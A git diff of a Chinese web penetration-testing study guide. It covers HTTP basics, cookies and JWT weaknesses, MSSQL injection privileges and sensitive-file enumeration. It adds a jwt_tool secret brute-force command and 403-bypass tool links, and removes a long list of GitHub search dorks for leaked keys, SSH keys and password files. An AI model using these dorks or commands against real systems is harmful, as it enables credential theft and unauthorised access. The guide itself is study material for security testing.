@@ -1,5 +1,4 @@
 
-
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210515191227460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 - [写在前面](#写在前面)
 - [常见知识点](#常见知识点)
@@ -17,22 +16,26 @@
         - [邮件协议族](#邮件协议族)
         - [邮件安全协议](#邮件安全协议)
     - [HTTP/HTTPS基础知识](#httphttps基础知识)
-      - [代理](#代理)
-      - [DNS](#dns)
-      - [静态与动态](#静态与动态)
+      - [http与https区别](#http与https区别)
+      - [状态码](#状态码)
       - [cookie](#cookie)
         - [cookie会话验证和token验证区别以及安全问题](#cookie会话验证和token验证区别以及安全问题)
         - [http中的cookie参数包含什么](#http中的cookie参数包含什么)
+      - [http协议版本](#http协议版本)
+      - [代理](#代理)
+      - [DNS](#dns)
+      - [静态与动态](#静态与动态)
       - [访问类型](#访问类型)
-      - [状态码](#状态码)
+      - [状态码](#状态码-1)
     - [编程语言](#编程语言)
       - [思想](#思想)
         - [MVC](#mvc)
     - [数据库](#数据库)
       - [关系型](#关系型)
         - [关系型数据库代表](#关系型数据库代表)
-          - [access](#access)
           - [mysql](#mysql)
+          - [access](#access)
+          - [mysql](#mysql-1)
       - [非关系型](#非关系型)
     - [Linux](#linux)
         - [权限划分](#权限划分)
@@ -62,7 +65,7 @@
         - [方法五：搜索引擎子域名](#方法五搜索引擎子域名)
         - [方法六：DNS发现子域名](#方法六dns发现子域名)
         - [方法七：其他方法发现子域名](#方法七其他方法发现子域名)
-      - [目录爆破](#目录爆破)
+      - [目录爆破/敏感文件爆破](#目录爆破敏感文件爆破)
         - [工具](#工具)
         - [目录爆破经验](#目录爆破经验)
         - [图像](#图像)
@@ -169,6 +172,7 @@
       - [越权](#越权)
         - [越权测试](#越权测试)
         - [防御](#防御-2)
+  - [开放性](#开放性)
   - [登录脆弱](#登录脆弱)
     - [漏洞类型](#漏洞类型)
     - [验证脆弱](#验证脆弱)
@@ -203,6 +207,7 @@
     - [XXE防御方案](#xxe防御方案)
   - [点击劫持（Clickjacking）](#点击劫持clickjacking)
     - [什么是点击劫持？](#什么是点击劫持)
+    - [点击劫持](#点击劫持)
   - [远程命令执行（RCE）](#远程命令执行rce)
     - [实例：网站可执行系统命令](#实例网站可执行系统命令)
   - [SQL注入](#sql注入)
@@ -245,8 +250,6 @@
     - [什么是网页缓存中毒？](#什么是网页缓存中毒)
     - [Web 缓存中毒攻击的影响是什么？](#web-缓存中毒攻击的影响是什么)
     - [构建网络缓存中毒攻击](#构建网络缓存中毒攻击)
-      - [识别和评估未加密的输入](#识别和评估未加密的输入)
-        - [Param Miner](#param-miner)
       - [从后端服务器引出有害响应](#从后端服务器引出有害响应)
       - [获取缓存的响应](#获取缓存的响应)
       - [如何防止网页缓存中毒漏洞](#如何防止网页缓存中毒漏洞)
@@ -279,16 +282,26 @@
     - [如何验证http主机头漏洞？](#如何验证http主机头漏洞)
     - [如何利用http主机头漏洞？](#如何利用http主机头漏洞)
     - [如何防止HTTP Host头攻击](#如何防止http-host头攻击)
-  - [xss攻击](#xss攻击)
-    - [基础使用](#基础使用)
-    - [典型用法](#典型用法)
-    - [工具](#工具-3)
-      - [XSStrike](#xsstrike)
+  - [跨站脚本（xss）](#跨站脚本xss)
+    - [什么是xss](#什么是xss)
+    - [XSS 攻击有哪些类型？](#xss-攻击有哪些类型)
+      - [DOM型XSS](#dom型xss)
+    - [XSS 可以用来做什么？](#xss-可以用来做什么)
+    - [XSS 漏洞的影响](#xss-漏洞的影响)
+    - [XSS 漏洞验证](#xss-漏洞验证)
+    - [手动XSS验证语句思路](#手动xss验证语句思路)
+      - [快速XSS验证](#快速xss验证)
+        - [burpsuite的XSS清单](#burpsuite的xss清单)
+        - [XSStrike](#xsstrike)
+        - [xss的fuzz字段](#xss的fuzz字段)
+      - [XSS常出现位置](#xss常出现位置)
+    - [XSS漏洞利用](#xss漏洞利用)
+      - [窃取 cookie](#窃取-cookie)
       - [xss平台](#xss平台)
       - [beef-xss](#beef-xss)
-    - [防御与绕过](#防御与绕过)
-      - [防御](#防御-3)
-      - [绕过过滤](#绕过过滤)
+    - [XSS防御](#xss防御)
+    - [关于XSS的常见问题](#关于xss的常见问题)
+    - [XSS学习资源](#xss学习资源)
   - [跨站请求伪造 (CSRF）](#跨站请求伪造-csrf)
     - [什么是CSRF？](#什么是csrf)
     - [CSRF 攻击的影响是什么？](#csrf-攻击的影响是什么)
@@ -312,30 +325,10 @@
 - [绕过检测](#绕过检测)
   - [待补充：免杀](#待补充免杀)
   - [WAF绕过](#waf绕过)
-      - [市面上WAF](#市面上waf)
-        - [阿里云盾](#阿里云盾)
-        - [宝塔](#宝塔)
-        - [安全狗](#安全狗)
-        - [将会流行的WAF](#将会流行的waf)
-      - [市面上常见绕过工具](#市面上常见绕过工具)
-    - [通用](#通用)
-      - [待补充：全扫描工具](#待补充全扫描工具)
-      - [流量监控](#流量监控)
-        - [躲避](#躲避)
-        - [经验](#经验)
-    - [SQL绕过](#sql绕过)
-      - [默认未开启的防御绕过](#默认未开启的防御绕过)
-        - [sqlmap](#sqlmap)
-        - [手动](#手动)
-    - [文件上传绕过](#文件上传绕过)
-      - [安全狗](#安全狗-1)
-    - [xss 绕过](#xss-绕过)
-    - [权限控制拦截](#权限控制拦截)
-    - [其他绕过总结](#其他绕过总结)
 - [经验积累](#经验积累)
   - [漏洞出现在？](#漏洞出现在)
     - [URL参数](#url参数)
-      - [经验](#经验-1)
+      - [经验](#经验)
       - [出现在：参数可渲染](#出现在参数可渲染)
       - [+http参数污染](#http参数污染)
       - [+CRLF](#crlf)
@@ -359,7 +352,7 @@
     - [struct2](#struct2)
   - [组件](#组件)
     - [敏感信息搜集](#敏感信息搜集)
-    - [工具](#工具-4)
+    - [工具](#工具-3)
       - [利用](#利用-1)
       - [弱口令](#弱口令)
     - [thinkphp5](#thinkphp5)
@@ -375,7 +368,7 @@
   - [蜜罐](#蜜罐)
   - [Webshell](#webshell)
 - [系统漏洞](#系统漏洞)
-  - [工具](#工具-5)
+  - [工具](#工具-4)
     - [探测工具简介](#探测工具简介)
     - [EXP工具](#exp工具)
         - [Metasploit](#metasploit)
@@ -384,6 +377,7 @@
     - [fuzzy](#fuzzy)
 - [API漏洞](#api漏洞)
 - [微信小程序漏洞](#微信小程序漏洞)
+- [PC端软件](#pc端软件)
 - [APP漏洞](#app漏洞)
   - [抓包](#抓包)
 - [待补充：应急响应](#待补充应急响应)
@@ -405,7 +399,7 @@
     - [站点伪造](#站点伪造)
     - [who am i](#who-am-i)
   - [钓鱼](#钓鱼-1)
-    - [工具](#工具-6)
+    - [工具](#工具-5)
       - [gophish](#gophish)
     - [钓鱼手段](#钓鱼手段)
       - [链接存放在](#链接存放在)
@@ -416,7 +410,7 @@
       - [钓鱼 wifi](#钓鱼-wifi)
     - [定向社工](#定向社工)
   - [如何在本地查询](#如何在本地查询)
-- [经验](#经验-2)
+- [经验](#经验-1)
   - [知名网站](#知名网站)
   - [IP伪造](#ip伪造)
     - [攻破类似网站](#攻破类似网站)
@@ -461,7 +455,7 @@
     - [信息搜集](#信息搜集-2)
 - [杂项](#杂项)
   - [获取数据库账号密码](#获取数据库账号密码)
-    - [mysql](#mysql-1)
+    - [mysql](#mysql-2)
       - [获取基本信息](#获取基本信息)
       - [获取root账号密码](#获取root账号密码)
       - [Oracle](#oracle)
@@ -491,7 +485,7 @@
       - [压缩通配符](#压缩通配符)
       - [定时任务执行权限分配过高](#定时任务执行权限分配过高)
     - [数据库提权](#数据库提权)
-      - [Mysql](#mysql-2)
+      - [Mysql](#mysql-3)
         - [UDF](#udf)
         - [MOF](#mof)
         - [启动项知识点:(基于配合操作系统自启动)](#启动项知识点基于配合操作系统自启动)
@@ -522,9 +516,9 @@
         - [寻找可控输入](#寻找可控输入)
         - [过滤敏感字符方案](#过滤敏感字符方案)
       - [SQL注入](#sql注入-1)
-        - [防御](#防御-4)
-      - [手动](#手动-1)
-      - [工具](#工具-7)
+        - [防御](#防御-3)
+      - [手动](#手动)
+      - [工具](#工具-6)
 - [待补充：物理攻击](#待补充物理攻击)
   - [wifi](#wifi)
   - [ID卡](#id卡)
@@ -765,7 +759,8 @@ https://en.wikipedia.org/wiki/DMARC#Alignment
 
 ### HTTP/HTTPS基础知识
 
-**http与https区别**
+#### http与https区别
+
 HTTP与HTTPS区别：
 https可以理解为http+ssl。小网站通常买不起SSL证书（一般几千到几万），所以这些网站会签订私人的SSL证书，私人的SSL证书会提示网站是私密链接。
 
@@ -773,6 +768,91 @@ SSL协议位于TCP/IP协议与各种应用层协议之间，为数据通讯提�
 SSL记录协议（SSL Record Protocol）：它建立在可靠的传输协议（如TCP）之上，为高层协议提供数据封装、压缩、加密等基本功能的支持。
 SSL握手协议（SSL Handshake Protocol）：它建立在SSL记录协议之上，用于在实际的数据传输开始前，通讯双方进行身份认证、协商加密算法、交换加密密钥等。
 
+#### 状态码
+
+1xx（临时响应）
+表示临时响应并需要请求者继续执行操作的状态代码。
+
+2xx （成功）
+表示成功处理了请求的状态代码。
+
+3xx （重定向）
+表示要完成请求，需要进一步操作。 通常，这些状态代码用来重定向。
+
+4xx（请求错误）
+这些状态代码表示请求可能出错，妨碍了服务器的处理。
+
+5xx（服务器错误）
+这些状态代码表示服务器在尝试处理请求时发生内部错误。 这些错误可能是服务器本身的错误，而不是请求出错。
+
+最常见的
+200（成功） 
+403（禁止） 权限不够，服务器拒绝请求。对于403可以使用burpsuite插件尝试绕权限 https://github.com/sting8k/BurpSuite_403Bypasser或 https://github.com/yunemse48/403bypasser.git
+404（未找到）这个界面有可能是攻击者存放了潜在后门
+
+#### cookie
+
+##### cookie会话验证和token验证区别以及安全问题
+
+之所以出现这些附加参数是因为http是无状态请求，即这一次请求和上一次请求是没有任何关系的，互不认识的，没有关联的。但这几种认证又有差别。也有的人直接称这一对的区别是cookie和session区别，这与我说的cookie会话和tooken是一个意思。
+
+cookie 会话。服务器验证是查看session id是否匹配得上。存储服务器 存活时间较短  大型。cookie 会话就像比如你登录了一次支付宝，过了几分钟（一般30分钟左右）不用或关闭了浏览器就还需要你登录。一个session在服务器上会占用1kb，人多了还是挺耗内存的。由于跨站自动带上cookie所以存在CSRF攻击。如果管理员在用户退出时未销毁就存在所谓的会话固定，会话固定只需要盗取session就可以登录了。
+token 储存本地。服务器验证是查看参数附带的签名。存活时间较长 小中型。此方案不会存在CSRF攻击因为跨站请求不会自动填写token值，但由于存活时间长，一般容易xss盗取利用等
+
+对方网站如果只认token验证，那么你盗取 cookie会话是没什么价值的。反过来只认 cookie会话你盗取token做验证也是没有价值的。
+
+[想阅读两者区别更多可看这篇文章](https://wuch886.gitbooks.io/front-end-handbook/content/session-cookiehe-token-san-zhe-de-guan-xi-he-qu-bie.html)
+
+##### http中的cookie参数包含什么
+
+```bash
+Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm;
+route=c0dbc3af6294b1446f771c1a1aa4c7cb;
+csrf=WfF1szMUHhiokx9AHFply5L2xAOfjRkE;
+Authorization=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+rememberme=eKKF2QT4fwpMeJf36POk6yJV
+```
+
+**session**
+作用：记录用户状态。
+常见生成方法：账户标识字符串（用户名、id、邮箱、身份等）、IP、递增序号等
+可能产生漏洞：会话固定（退出后会话不变）、cookie被解密可利用Padding Oracle - Padbuster
+
+**csrf**
+作用：防御csrf漏洞
+常见生成方法：通常加密强度伪随机数生成器 (PRNG)，以创建时的时间戳加上静态秘密作为种子，并对整个结构进行强散列
+使用：每次请求时带上经绑定session的csrf的值，每次操作csrf重新生成（防止复用和重放）
+可能产生漏洞：csrf可被分析出
+**rememberme**
+![在这里插入图片描述](https://img-blog.csdnimg.cn/fc324a18698d4e60a09ac5a21d03c0e2.png)
+
+**JWT**
+
+作用：加密数据包或cookie
+常见生成方法：JWT分为头部(header)，声明(claims)，签名(signature)，三个部分以英文句号隔开。头部和声明会采用base64加密，签名加密与头部和声明都有关，还要进行整体的sha加密才可以得到最终值.
+
+![在这里插入图片描述](https://img-blog.csdnimg.cn/7384db1a2bd246bf87b27ed58e454c99.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5YyX5LiQ5a6J5YWo,size_20,color_FFFFFF,t_70,g_se,x_16)
+
+加密方式如下图，对此的解密要用密匙才能解开。如果你还是困惑我表达的意思，你可以访问 https://jwt.io/ 输入一段JWT来交互加解密。
+![在这里插入图片描述](https://img-blog.csdnimg.cn/f1d68e5b7ff043b8a9b41fc514ce3eac.png)
+
+可能产生漏洞：1.JWT攻击取决于对方服务器是接收数据来进行什么样的下一步操作，如果是身份验证那么你就可以做到越权，如果是取数据与SQL语句拼接，那么你就可以做到SQL注入...
+
+2.JWT支持将算法设定为“None”。如果“alg”字段设为“ None”，那么签名会被置空，这样任何token都是有效的。
+设定该功能的最初目的是为了方便调试。但是，若不在生产环境中关闭该功能，攻击者可以通过将alg字段设置为“None”来伪造他们想要的任何token，接着便可以使用伪造的token冒充任意用户登陆网站。
+
+jwt破解（需密钥）：爆破方法是将常用字典一个个当做秘钥，每个秘钥对应着不同的签名，将生成的签名与真实签名进行比较
+python3 jwt_tool.py -M at -t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" -rh "Authorization: Bearer eyJhbG...<JWT Token>"
+
+
+
+**rount**
+“route”是指根据url分配到对应的处理程序。
+
+#### http协议版本
+
+http1：客户端连接网络服务器建立连接后，只能获取一个网络资源
+http1：客户端连接网络服务器建立连接后，只能获取一个网络资源
 
 #### 代理
 
@@ -820,58 +900,7 @@ DNS隧道工具将进入隧道的其他协议流量封装到DNS协议内，在�
 
 index.php（做个例子实际下index没太大意义）和网页展示的php通常不会是一样文件(网页只有js或html源码和F12结果是一样的，这可以用来判断一些网站是做前端验证还是服务器验证)，前者源码包含的文件更多，后者是解析后的文件。
 
-#### cookie
 
-##### cookie会话验证和token验证区别以及安全问题
-
-之所以出现这些附加参数是因为http是无状态请求，即这一次请求和上一次请求是没有任何关系的，互不认识的，没有关联的。但这几种认证又有差别。也有的人直接称这一对的区别是cookie和session区别，这与我说的cookie会话和tooken是一个意思。
-
-cookie 会话。服务器验证是查看session id是否匹配得上。存储服务器 存活时间较短  大型。cookie 会话就像比如你登录了一次支付宝，过了几分钟（一般30分钟左右）不用或关闭了浏览器就还需要你登录。一个session在服务器上会占用1kb，人多了还是挺耗内存的。由于跨站自动带上cookie所以存在CSRF攻击。如果管理员在用户退出时未销毁就存在所谓的会话固定，会话固定只需要盗取session就可以登录了。
-token 储存本地。服务器验证是查看参数附带的签名。存活时间较长 小中型。此方案不会存在CSRF攻击因为跨站请求不会自动填写token值，但由于存活时间长，一般容易xss盗取利用等
-
-对方网站如果只认token验证，那么你盗取 cookie会话是没什么价值的。反过来只认 cookie会话你盗取token做验证也是没有价值的。
-
-[想阅读两者区别更多可看这篇文章](https://wuch886.gitbooks.io/front-end-handbook/content/session-cookiehe-token-san-zhe-de-guan-xi-he-qu-bie.html)
-
-##### http中的cookie参数包含什么
-
-```bash
-Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm;
-route=c0dbc3af6294b1446f771c1a1aa4c7cb;
-csrf=WfF1szMUHhiokx9AHFply5L2xAOfjRkE;
-Authorization=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
-```
-**session**
-作用：记录用户状态。
-常见生成方法：账户标识字符串（用户名、id、邮箱、身份等）、IP、递增序号等
-**csrf**
-作用：防御csrf漏洞
-常见生成方法：通常加密强度伪随机数生成器 (PRNG)，以创建时的时间戳加上静态秘密作为种子，并对整个结构进行强散列
-使用：每次请求时带上经绑定session的csrf的值，每次操作csrf重新生成（防止复用和重放）
-可能产生漏洞：csrf可被分析出
-
-**JWT**
-
-作用：加密数据包或cookie
-常见生成方法：JWT分为头部(header)，声明(claims)，签名(signature)，三个部分以英文句号隔开。头部和声明会采用base64加密，签名加密与头部和声明都有关，还要进行整体的sha加密才可以得到最终值.
-
-![在这里插入图片描述](https://img-blog.csdnimg.cn/7384db1a2bd246bf87b27ed58e454c99.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5YyX5LiQ5a6J5YWo,size_20,color_FFFFFF,t_70,g_se,x_16)
-
-加密方式如下图，对此的解密要用密匙才能解开。如果你还是困惑我表达的意思，你可以访问 https://jwt.io/ 输入一段JWT来交互加解密。
-![在这里插入图片描述](https://img-blog.csdnimg.cn/f1d68e5b7ff043b8a9b41fc514ce3eac.png)
-
-可能产生漏洞：1.JWT攻击取决于对方服务器是接收数据来进行什么样的下一步操作，如果是身份验证那么你就可以做到越权，如果是取数据与SQL语句拼接，那么你就可以做到SQL注入...
-
-2.JWT支持将算法设定为“None”。如果“alg”字段设为“ None”，那么签名会被置空，这样任何token都是有效的。
-设定该功能的最初目的是为了方便调试。但是，若不在生产环境中关闭该功能，攻击者可以通过将alg字段设置为“None”来伪造他们想要的任何token，接着便可以使用伪造的token冒充任意用户登陆网站。
-
-jwt破解（需密钥）：爆破方法是将常用字典一个个当做秘钥，每个秘钥对应着不同的签名，将生成的签名与真实签名进行比较
-
-
-
-
-**rount**
-“route”是指根据url分配到对应的处理程序。
 
 #### 访问类型
 
@@ -881,25 +910,6 @@ get传参与post传参的区别
 
 #### 状态码
 
-1xx（临时响应）
-表示临时响应并需要请求者继续执行操作的状态代码。
-
-2xx （成功）
-表示成功处理了请求的状态代码。
-
-3xx （重定向）
-表示要完成请求，需要进一步操作。 通常，这些状态代码用来重定向。
-
-4xx（请求错误）
-这些状态代码表示请求可能出错，妨碍了服务器的处理。
-
-5xx（服务器错误）
-这些状态代码表示服务器在尝试处理请求时发生内部错误。 这些错误可能是服务器本身的错误，而不是请求出错。
-
-最常见的
-200（成功） 
-403（禁止） 权限不够，服务器拒绝请求。对于403可以使用burpsuite插件尝试绕权限 https://github.com/sting8k/BurpSuite_403Bypasser
-404（未找到）
 
 
 ### 编程语言
@@ -961,6 +971,15 @@ python,mongodb,mysql...
 常见的关系型数据库有 Oracle、DB2、PostgreSQL、Microsoft SQL Server、Microsoft   
 Access 和 MySQL 等。
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705151830704.png)
+
+###### mysql
+
+Microsoft SQL Sever <2008权限是system
+Microsoft SQL Sever>=008 低权限
+
+为了迎合新的版本我以后文章的实验都在2008版本下面进行，同时也介绍以前可以利用的方法，相对于MySQL这个mssql显得重了许多，他众多的功能也给我们注入过程带来了便利， 所以一般数据库为mssql支持多语句我们就考虑是不是应该直接拿下webshell。
+
+对于mssql的一个注入点我们往往最关心的这个注入点的权限问题,是sa、db_owner还是public;其次是这个注点是否显错,注释语句是否可用,例如sql server中注释符“–”;还有就是注入点是什么类型的,是字符型注入,还是数字型注入。
 
 ###### access
 
@@ -1112,6 +1131,7 @@ netstat -ano
 更多阅读，apache的.htaccess文件作用和相关浅析 https://www.jianshu.com/p/81305ca91ebd
 
 # 信息收集
+
 ## 信息搜集开源项目
 
 自动化信息搜集（项目更新时间是2019年了）https://github.com/bit4woo/teemo
@@ -1122,12 +1142,13 @@ netstat -ano
 
 
 ### 中间件
+
 **主流**
 wappalyzer浏览器插件自动搜集网站所采用的框架等https://github.com/AliasIO/wappalyzer/releases
 burpsuite插件，还能自动查找是否有CVE漏洞 software vulnerabliuty scanner
 百度搜索关键词打开链接：CMS在线识别网站
 **小众**
-通过寻找js匹配语句分析，分析成功一个后加规则填充到bp插件中，下次就不用手动分析了
+通过寻找js匹配语句分析。分析成功一个后加规则填充到bp插件中，下次就不用手动分析了
 **识别方法1：利用工具**
 
 
@@ -1139,11 +1160,13 @@ burpsuite插件，还能自动查找是否有CVE漏洞 software vulnerabliuty sc
 ### 源码层面收集
 
 通研究前端源代码，能够发现一些敏感目录，你可以通过打开开发者模式查看源码，有些网站会对开发者模式禁止，这时候你可以逐一尝试以下方案打开：
+
 * F12
 * shift-F5
 * 页面右键
 
 查看前端源码，你可以从以下几个角度查看
+
 * 文件命名规则
 * 增加攻击面(url、域名。推荐直接使用自动化js搜集资产信息工具https://github.com/Threezh1/JSFinder)
 * 敏感信息(密码、API密钥、加密方式)
@@ -1175,288 +1198,6 @@ https://github.com/kootenpv/gittyleaks
 https://github.com/dxa4481/truffleHog
 https://github.com/obheda12/GitDorker
 常见的敏感信息有：
-
-```bash
-".mlab.com password"
-"access_key"
-"access_token"
-"amazonaws"
-"api.googlemaps AIza"
-"api_key"
-"api_secret"
-"apidocs"
-"apikey"
-"apiSecret"
-"app_key"
-"app_secret"
-"appkey"
-"appkeysecret"
-"application_key"
-"appsecret"
-"appspot"
-"auth"
-"auth_token"
-"authorizationToken"
-"aws_access"
-"aws_access_key_id"
-"aws_key"
-"aws_secret"
-"aws_token"
-"AWSSecretKey"
-"bashrc password"
-"bucket_password"
-"client_secret"
-"cloudfront"
-"codecov_token"
-"config"
-"conn.login"
-"connectionstring"
-"consumer_key"
-"credentials"
-"database_password"
-"db_password"
-"db_username"
-"dbpasswd"
-"dbpassword"
-"dbuser"
-"dot-files"
-"dotfiles"
-"encryption_key"
-"fabricApiSecret"
-"fb_secret"
-"firebase"
-"ftp"
-"gh_token"
-"github_key"
-"github_token"
-"gitlab"
-"gmail_password"
-"gmail_username"
-"herokuapp"
-"internal"
-"irc_pass"
-"JEKYLL_GITHUB_TOKEN"
-"key"
-"keyPassword"
-"ldap_password"
-"ldap_username"
-"login"
-"mailchimp"
-"mailgun"
-"master_key"
-"mydotfiles"
-"mysql"
-"node_env"
-"npmrc _auth"
-"oauth_token"
-"pass"
-"passwd"
-"password"
-"passwords"
-"pem private"
-"preprod"
-"private_key"
-"prod"
-"pwd"
-"pwds"
-"rds.amazonaws.com password"
-"redis_password"
-"root_password"
-"secret"
-"secret.password"
-"secret_access_key"
-"secret_key"
-"secret_token"
-"secrets"
-"secure"
-"security_credentials"
-"send.keys"
-"send_keys"
-"sendkeys"
-"SF_USERNAME salesforce"
-"sf_username"
-"site.com" FIREBASE_API_JSON=
-"site.com" vim_settings.xml
-"slack_api"
-"slack_token"
-"sql_password"
-"ssh"
-"ssh2_auth_password"
-"sshpass"
-"staging"
-"stg"
-"storePassword"
-"stripe"
-"swagger"
-"testuser"
-"token"
-"x-api-key"
-"xoxb "
-"xoxp"
-[WFClient] Password= extension:ica
-access_key
-bucket_password
-dbpassword
-dbuser
-extension:avastlic "support.avast.com"
-extension:bat
-extension:cfg
-extension:env
-extension:exs
-extension:ini
-extension:json api.forecast.io
-extension:json googleusercontent client_secret
-extension:json mongolab.com
-extension:pem
-extension:pem private
-extension:ppk
-extension:ppk private
-extension:properties
-extension:sh
-extension:sls
-extension:sql
-extension:sql mysql dump
-extension:sql mysql dump password
-extension:yaml mongolab.com
-extension:zsh
-filename:.bash_history
-filename:.bash_history DOMAIN-NAME
-filename:.bash_profile aws
-filename:.bashrc mailchimp
-filename:.bashrc password
-filename:.cshrc
-filename:.dockercfg auth
-filename:.env DB_USERNAME NOT homestead
-filename:.env MAIL_HOST=smtp.gmail.com
-filename:.esmtprc password
-filename:.ftpconfig
-filename:.git-credentials
-filename:.history
-filename:.htpasswd
-filename:.netrc password
-filename:.npmrc _auth
-filename:.pgpass
-filename:.remote-sync.json
-filename:.s3cfg
-filename:.sh_history
-filename:.tugboat NOT _tugboat
-filename:_netrc password
-filename:apikey
-filename:bash
-filename:bash_history
-filename:bash_profile
-filename:bashrc
-filename:beanstalkd.yml
-filename:CCCam.cfg
-filename:composer.json
-filename:config
-filename:config irc_pass
-filename:config.json auths
-filename:config.php dbpasswd
-filename:configuration.php JConfig password
-filename:connections
-filename:connections.xml
-filename:constants
-filename:credentials
-filename:credentials aws_access_key_id
-filename:cshrc
-filename:database
-filename:dbeaver-data-sources.xml
-filename:deployment-config.json
-filename:dhcpd.conf
-filename:dockercfg
-filename:environment
-filename:express.conf
-filename:express.conf path:.openshift
-filename:filezilla.xml
-filename:filezilla.xml Pass
-filename:git-credentials
-filename:gitconfig
-filename:global
-filename:history
-filename:htpasswd
-filename:hub oauth_token
-filename:id_dsa
-filename:id_rsa
-filename:id_rsa or filename:id_dsa
-filename:idea14.key
-filename:known_hosts
-filename:logins.json
-filename:makefile
-filename:master.key path:config
-filename:netrc
-filename:npmrc
-filename:pass
-filename:passwd path:etc
-filename:pgpass
-filename:prod.exs
-filename:prod.exs NOT prod.secret.exs
-filename:prod.secret.exs
-filename:proftpdpasswd
-filename:recentservers.xml
-filename:recentservers.xml Pass
-filename:robomongo.json
-filename:s3cfg
-filename:secrets.yml password
-filename:server.cfg
-filename:server.cfg rcon password
-filename:settings
-filename:settings.py SECRET_KEY
-filename:sftp-config.json
-filename:sftp-config.json password
-filename:sftp.json path:.vscode
-filename:shadow
-filename:shadow path:etc
-filename:spec
-filename:sshd_config
-filename:token
-filename:tugboat
-filename:ventrilo_srv.ini
-filename:WebServers.xml
-filename:wp-config
-filename:wp-config.php
-filename:zhrc
-HEROKU_API_KEY language:json
-HEROKU_API_KEY language:shell
-HOMEBREW_GITHUB_API_TOKEN language:shell
-jsforce extension:js conn.login
-language:yaml -filename:travis
-msg nickserv identify filename:config
-org:Target "AWS_ACCESS_KEY_ID"
-org:Target "list_aws_accounts"
-org:Target "aws_access_key"
-org:Target "aws_secret_key"
-org:Target "bucket_name"
-org:Target "S3_ACCESS_KEY_ID"
-org:Target "S3_BUCKET"
-org:Target "S3_ENDPOINT"
-org:Target "S3_SECRET_ACCESS_KEY"
-password
-path:sites databases password
-private -language:java
-PT_TOKEN language:bash
-redis_password
-root_password
-secret_access_key
-SECRET_KEY_BASE=
-shodan_api_key language:python
-WORDPRESS_DB_PASSWORD=
-xoxp OR xoxb OR xoxa
-s3.yml
-.exs
-beanstalkd.yml
-deploy.rake
-.sls
-AWS_SECRET_ACCESS_KEY
-API KEY
-API SECRET
-API TOKEN
-ROOT PASSWORD
-ADMIN PASSWORD
-GCP SECRET
-AWS SECRET
-"private" extension:pgp
-```
 
 ## 特殊信息
 
@@ -1666,10 +1407,11 @@ https://github.com/lc/gau
 https://github.com/nsonaniya2010/SubDomainizer
 https://github.com/Cillian-Collins/subscraper
 
-#### 目录爆破
+#### 目录爆破/敏感文件爆破
 
 扫描敏感文件
 robots.txt
+log.log	#	分析是否有敏感日志，这里敏感信息包括：其他攻击者的恶意代码
 crossdomain.xml
 sitemap.xml
 xx.tar.gz
@@ -2264,17 +2006,7 @@ bp使用通常会装上很多可行的插件，[手动安装方法可参见，�
  - Autorize 强大的越权自动化测试工具
  - Software Vulnerability Scanner 自动根据版本号查找 CVE
 
-**详细待补充burpsuite安装、功能模块、网页代理设置**
-数据联动
-Burp Intruder也可以通过字典攻击来实施强制浏览(通常是在url参数和文件路径部分进行修改)，爆破、注入等。
-
-burpsuite当抓不到包时，可能是目标网站是个无发送数据包的网站，比如只有一些静态的js代码，你的交互都是在目标主机本机运行，因此就不会展示数据包。比如你也许认为上传操作都可以抓到数据包，然而事实上是有的数据包是js操作，所以根本就不会反馈数据包给你
-
-
-hex是网站raw的二进制,在进行00截断时很有用。
-对于扫描的结果如果有更进一步的探究在扫描结果里右击repeater。在burpsuite里扫描分为主动和被动被动扫描更温和，不会破坏程序和主动扫描显得更暴力但更全面，通常采用的都是主动扫描。
-通过burpsuitede的repeater功能可以获取一些服务器信息，比如运行的Server类型及版本、PHP版本信息。repeater分析的选项有四种
-虽然 burpsuite专业版才带有scaner，但笔者测试感觉这个功能不是很好用。![在这里插入图片描述](https://img-blog.csdnimg.cn/2021051200383657.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+[burpsuite模块介绍](https://www.mad-coding.cn/2019/10/15/burpsuite%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0%E6%8C%87%E5%8D%97/#0x01)
 在面试和实战中需要区分burpsuite攻击参数注入的基本方式
 
 1. Sniper（狙击手）
@@ -2309,22 +2041,23 @@ pl2：3，4
    2，4
    2，5.。。。。。。
 
-**模块**
-repeater是结合其他模块一起使用的，做补发测试，得到的内容再进一步做手动修改参数
-compare用于对比两次数据的差异，比如枚举用户名，查看返回登录结果的差异
-Intruder是一个高度可配置工具，可以对web自动化攻击，模糊测试，sql注入，目录遍历等
+
+**常见问题**
+[burp总是抓到垃圾数据](https://www.mad-coding.cn/2020/03/06/burp%E6%80%BB%E6%98%AF%E6%8A%93%E5%88%B0%E6%97%A0%E7%94%A8%E5%8C%85%E7%9A%84%E5%9B%B0%E6%89%B0/)
 
 ### 通用漏洞扫描工具
 
 nessus、openvas、xray、AWVS、NetSparker等
 
 #### 主机扫描
+
 **Nessus** 
 
 Nessus 是目前全世界最多人使用的系统漏洞扫描与分析软件。总共有超过75,000个机构使用 Nessus 作为扫描该机构电脑系统的软件。
 如何破解[http://www.luckyzmj.cn/posts/477c90d0.html#toc-heading-1](http://www.luckyzmj.cn/posts/477c90d0.html#toc-heading-1)
 
